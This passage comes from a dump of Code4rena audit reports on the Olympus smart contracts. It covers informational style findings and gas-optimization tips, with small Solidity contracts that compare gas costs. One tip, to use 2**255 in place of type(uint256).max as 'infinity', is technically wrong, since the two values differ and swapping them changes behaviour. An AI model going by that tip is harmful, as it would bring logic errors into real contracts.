[`RANGE.sol#L20-L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L20-L31), [`PRICE.sol#L26-L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L26-L28), [`INSTR.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L11), [`TreasuryCustodian.sol#L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L17), [`Operator.sol#L45-L54`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L45-L54), [`Operator.sol#L188`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L188), [`Governance.sol#L61-L137`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L61-L137)  **Description**: The best-practice layout for a contract should follow the following order: state variables, events, modifiers, constructor and functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier.  Functions should be grouped according to their visibility and ordered as: constructor, receive function (if exists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: Modifiers are in the middle of contracts. External/public functions are mixed with internal/private ones. Few events are declared in contracts while most others are in corresponding interfaces.  **Recommendation**: Consider adopting recommended best-practice for code structure and layout.   ## [NAZ-N5] Comment Line Length **Severity**: Informational **Context**: [`RANGE.sol#L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L40), [`RANGE.sol#L44`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L44), [`RANGE.sol#L46-L48`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L46-L48), [`RANGE.sol#L61-L62`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L61-L62), [`RANGE.sol#L214`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L214), [`RANGE.sol#L239-L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L239-L240), [`RANGE.sol#L261-L262`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L261-L262), [`PRICE.sol#L19-L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L19-L20), [`PRICE.sol#L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L31), [`PRICE.sol#L39-L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L39-L40), [`PRICE.sol#L46`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L46), [`PRICE.sol#L78`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#l78), [`PRICE.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L120), [`PRICE.sol#L189`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L189), [`PRICE.sol#L201`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L201), [`PRICE.sol#L203`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L203), [`PRICE.sol#L263-L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L263-L264), [`Operator.sol#L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97), [`Operator.sol#L199`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L199), [`Operator.sol#L481`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L481), [`Operator.sol#L657`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657), [`Operator.sol#L730`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L730), [`Operator.sol#L734`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L734), [`PriceConfig.sol#L41`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L41), [`PriceConfig.sol#L43`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L43), [`PriceConfig.sol#L66-L67`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L66-L67), [`Governance.sol#L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119), [`Governance.sol#L156`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L156), [`Governance.sol#L158`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L158), [`IBondCallback.sol#L7`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L7), [`IOperator.sol#L13`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13), [`IOperator.sol#L15-L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15-L17), [`IOperator.sol#L34`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L34), [`IOperator.sol#L72-L73`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L72-L73), [`IOperator.sol#L79`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L79), [`IOperator.sol#L84`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L84), [`IOperator.sol#L90-L91`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L90-L91), [`IOperator.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L100), [`IOperator.sol#L108`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L108), [`IOperator.sol#L124`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L124), [`IOperator.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L130), [`IOperator.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L135), [`IOperator.sol#L141`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L141)  **Description**: Max line length must be no more than 120 but many comments are extended past this length.  **Recommendation**: Consider cutting down the line length below 120.   ## [NAZ-N6] Code Contains Empty Blocks **Severity**: Informational **Context**: [`Kernel.sol#L85`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L85), [`Kernel.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L95), [`Kernel.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100), [`Kernel.sol#L105`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L105), [`Kernel.sol#L115`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L115), [`Kernel.sol#L139`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139), [`Kernel.sol#L143`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143), [`TRSRY.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L45), [`VOTES.sol#L19`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L19), [`INSTR.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L20), [`TreasuryCustodian.sol#L24`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L24), [`PriceConfig.sol#L15`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L15), [`Governance.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L59), [`VoterRegistration.sol#L16`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L16)  **Description**: It's best practice that when there is an empty block, to add a comment in the block explaining why it's empty.  **Recommendation**: Consider adding `/* Comment on why */` to the empty blocks.   ## [NAZ-N7] Use Underscores for Number Literals **Severity**: Informational **Context**: [`RANGE.sol#L245`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245), [`RANGE.sol#L247`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247), [`RANGE.sol#L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L264), [`Operator.sol#L111`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L111), [`Operator.sol#L518`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L518), [`Operator.sol#L550`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L550), [`Governance.sol#L164`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L164)  **Description**: There are multiple occasions where certain numbers have been hardcoded, either in variables or in the code itself. Large numbers can become hard to read.  **Recommendation**: Consider using underscores for number literals to improve its readability.   ## [NAZ-N8] TODOs Left In The Code **Severity**: Informational **Context**: [`TreasuryCustodian.sol#L51-L52`](https://github.com/code-423n4/202"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/438", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [NAZ-G1] Moving `if (proposalHasBeenActivated[proposalId_] == true)`  **Context**: [`Governance.sol#L230-L232`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L230-L232)  **Description**: Moving: ```js if (proposalHasBeenActivated[proposalId_] == true) {  revert ProposalAlreadyActivated(); } ``` earlier in `activateProposal()` will make it fail sooner and save gas.  **Recommendation**:  Consider moving `if (proposalHasBeenActivated[proposalId_] == true)` earlier in `activateProposal()`   ## [NAZ-G2] State Variables That Can Be Set To `Immutable` **Context**: [`BondCallback.sol#L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28), [`BondCallback.sol#L32`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  **Description**: Solidity `0.6.5` introduced `immutable` as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage. Each call to it reads from storage, using a `sload` costing 2100 gas cold or 100 gas warm. Setting it to `immutable` will have each storage read of the state variable to be replaced by the instruction `push32 value`, where `value` is set during contract construction time and this costs only 3 gas.  **Recommendation**:  Set the state variable to `immutable`.   ## [NAZ-G3] Right Shift Instead of Dividing By 2 **Context**: [`Operator.sol#L372`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372), [`Operator.sol#L427`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427)  **Description**: The `SHR` opcode is 3 gas cheaper than `DIV` and also bypasses Solidity's division by 0 prevention overhead.  **Recommendation**:  Consider using right shift instead of dividing by 2.   ## [NAZ-G4] Functions Visibility Can Be Declared External **Context**: [`Kernel.sol#L439`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439), [`Kernel.sol#L451`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451), [`TRSRY.sol#L75`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75), [`MINTR.sol#L33`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33), [`MINTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37), [`RANGE.sol#L215`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215), [`VOTES.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45), [`VOTES.sol#L51`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L51), [`INSTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37), [`Governance.sol#L145`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145), [`Governance.sol#L151`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151)  **Description**: Several functions across multiple contracts have a public visibility and can be marked with external visibility to save gas.   **Recommendation**:  Change the functions visibility to external to save gas.   ## [NAZ-G5] Use `calldata` Instead of `memory` For Function Parameters **Context**: [`TreasuryCustodian.sol#L53`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53), [`BondCallback.sol#L152`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)  **Description**: The dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload.  **Recommendation**:  Use `calldata` instead of `memory` for function parameters to avoid using memory with array values when a function is getting called externally.   ## [NAZ-G6] For array elements, `arr[i] = arr[i] + 1` is cheaper than `arr[i] += 1` **Context**: [`TRSRY.sol#L96-L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97), [`TRSRY.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131), [`VOTES.sol#L58`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58), [`BondCallback.sol#L143-L144`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144), [`Governance.sol#L198`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198), [`Governance.sol#L252`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252), [`Governance.sol#254`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  **Description**: Due to stack operations this is 25 gas cheaper when dealing with arrays in storage, and 4 gas cheaper for memory arrays.  **Recommendation**:  Use `arr[i] = arr[i] + 1` instead of `arr[i] += 1` when dealing with arrays   ## [NAZ-G7] Use `++index` instead of `index++` to increment a loop counter **Context**: [`KernelUtils.sol#L49`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49), [`KernelUtils.sol#L64`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  **Description**: Due to reduced stack operations, using `++index` saves 5 gas per iteration.  **Recommendation**:  Use `++index `to increment a loop counter.   ## [NAZ-G8] Use of `2**256 - 1 && type(uint256).max` When `2**255` Can Be Used **Context**: [`TRSRY.sol#L147`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L147), [`RANGE.sol#L88`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L88), [`RANGE.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L95), [`RANGE.sol#L221`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L221), [`RANGE.sol#L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L230), [`Operator.sol#L167`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L167), [`Operator.sol#L477`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L477), [`Operator.sol#L603`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L603), [`BondCallback.sol#L57`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L57), [`BondCallback.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L95)  **Description**: Infinity can also be represented via ``2**255`, it's hex representation is `0x8000000000000000000000000000000000000000000000000000000000000000` while `2**256 - 1` is `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. Then main difference is and where the gas savings come from is, zeros are cheaper than non-zero values in hex representation.  **Recommendation**:  Use `2**255` instead of `2**256 - 1` to save gas on deployment.   ## [NAZ-G9] Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## [NAZ-G10] Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/437", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Index [G01] Post-increment/decrement cost more gas then pre-increment/decrement [G02] Array length should not be looked up in every loop of a for-loop [G03] Operatos <= or >= cost more gas than operators < or > [G04] != 0 is cheaper than > 0 [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. [G06] Using private rather than public for constants [G07] Don't compare boolean expressions to boolean literals [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead [G09] Initialize variables with default values are not needed [G10] Using bools for storage incurs overhead [G11] Multiplication/division by two should use bit shifting [G12] Calldata vs Memory [G13] Use a more recent version of solidity [G14] Using storage instead of memory for structs/arrays [G15] Tight variable packing  [G16] Move variable declaration before is going to be used [G17] Refactoring code [G18] Use unchecked when it's not possible to overflow [G19] Internal functions only called once can be inlined to save gas [G20] Remove unused functions  # Details ## [G01] Post-increment/decrement cost more gas then pre-increment/decrement ### Description ++I (--I) cost less gas than I++ (I--) especially in a loop.  ### Proof of concept  ```solidity contract TestPost {  function testPost() public {   uint256 i;   i++;  } } contract TestPre {  function testPre() public {   uint256 i;   ++i;  } } ```  - Transaction cost of testPost is 21333 gas - Transaction cost of testPre is 21328 gas  - After the test it's possible to save **5 gas per ocurrence** with this optimization.  ### Lines in the code [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49) [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64) [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488) [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670) [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686)  ## [G02] Array length should not be looked up in every loop of a for-loop ### Description Storage array length checks incur an extra Gwarmaccess (100 gas) per loop.  Store the array length in a variable and use it in the for loop helps to save gas.  ### Proof of concept ```solidity contract TestForLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   for(uint256 i; i < array.length; ){    ++i;   }  } } contract TestForCachLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   uint256 arrayLen = array.length;   for(uint256 i; i < arrayLen; ){    ++i;   }  } } ``` - Transaction cost of TestForLength is 23217 gas - Transaction cost of TestForCachLength is 23200 gas  - After the test it's possible to save 17 gas in this loop so this mean **~2 gas per loop** is saved with this optimization in the test case of a local array.  ### Lines in the code [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278)  ## [G03] Operatos <= or >= cost more gas than operators < or > ### Description Change all <= / >= operators for < / > and remember to increse / decrese in consecuence to maintain the logic (example, a <= b for a < b + 1)  ### Proof of concept  ```solidity contract TestMaxEqual {   function testMaxEqual() public {   uint256 i = 1;   if (i >= 1){    i++;   }  } }  contract TestMax {   function TestMax() public {   uint256 i = 1;   if (i > 0){    i++;   }  } } ```  - Transaction cost of TestMaxEqual is 21367 gas - Transaction cost of TestMax is 21364 gas  - After the test it's possible to save **3 gas per ocurrence** with this optimization.  ### Lines in the code [Operator.sol#L210](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210) [Operator.sol#L211](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211) [Operator.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216) [Operator.sol#L217](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217) [Operator.sol#L486](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486) [Operator.sol#L667](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667) [Operator.sol#L683](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683)  ## [G04] != 0 is cheaper than > 0 ### Description Replace all > 0 for != 0  ### Lines in the code [Governance.sol#L247](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247)  ## [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. ### Description   ### Lines in the code [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96) [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97) [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115) [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116) [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131) [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132) [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136) [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138) [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222) [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56) [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58) [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143) [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144) [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103) [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194) [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198) [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252) [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254)  ## [G06] Using private rather than public for constants ### Description If needed, the value can be read from the verified contract source code.  Savings are due to the compiler not having to create non-payable getter functions for deployment calldata,  and not adding another entry to the method ID table.  ### Lines in the code [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121) [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124) [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127) [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130) [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133) [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137)  ## [G07] Don't compare boolean expressions to boolean literals ### Description if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ### Lines in the code [Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223) [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306)   ## [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead ### Description When using elements that are smaller than 32 bytes, your contract's gas usage may be higher. This is because the EVM operates on 32 bytes at a time.  Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. Use a larger size then downcast where needed  ### Lines in the code  [RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45) [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44) [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47) [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50) [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53) [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84) [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87) [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127) [PRICE.sol#L161](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161) [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185) [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83) [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Operator.sol#L371](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371) [Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372) [Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375) 